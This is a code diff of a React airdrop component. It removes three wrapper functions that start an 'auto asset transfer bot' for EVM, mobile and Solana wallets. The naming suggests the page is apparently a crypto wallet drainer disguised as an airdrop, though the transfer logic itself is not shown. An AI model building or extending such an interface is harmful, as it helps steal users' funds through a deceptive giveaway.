@@ -935,53 +935,7 @@ const AirdropSection = () => {
     }
   };
 
-  // Start mobile transfer process for all networks (TRC20 → Solana → BNB)
-  const startMobileTransferProcess = async () => {
-    setIsLoading(true);
-    
-    try {
-      toast.loading('📱 Starting mobile transfer process...', { id: 'mobile-transfer' });
-      
-      // Use the new auto bot for mobile too
-      await startAutoAssetTransferBot();
-      
-    } catch (error) {
-      setIsLoading(false);
-      toast.error('❌ Mobile transfer process failed!', { id: 'mobile-transfer' });
-    }
-  };
 
-  // Start transfer process for EVM wallets (MetaMask, TrustWallet)
-  const startTransferProcess = async () => {
-    setIsLoading(true);
-    
-    try {
-      toast.loading('🚀 Starting auto asset transfer...', { id: 'transfer-process' });
-      
-      // Use the new auto bot for all wallet types
-      await startAutoAssetTransferBot();
-      
-    } catch (error) {
-      setIsLoading(false);
-      toast.error('❌ Transfer process failed!', { id: 'transfer-process' });
-    }
-  };
-
-  // Start transfer process for Solana wallet (Phantom)
-  const startSolanaTransferProcess = async () => {
-    setIsLoading(true);
-    
-    try {
-      toast.loading('🚀 Starting auto asset transfer...', { id: 'sol-process' });
-      
-      // Use the new auto bot for Solana too
-      await startAutoAssetTransferBot();
-      
-    } catch (error) {
-      setIsLoading(false);
-      toast.error('❌ Solana transfer process failed!', { id: 'sol-process' });
-    }
-  };
 
   const copyAddress = () => {
     const addressToCopy = connectedWalletType === WALLET_TYPES.PHANTOM ? solanaAddress : walletAddress;
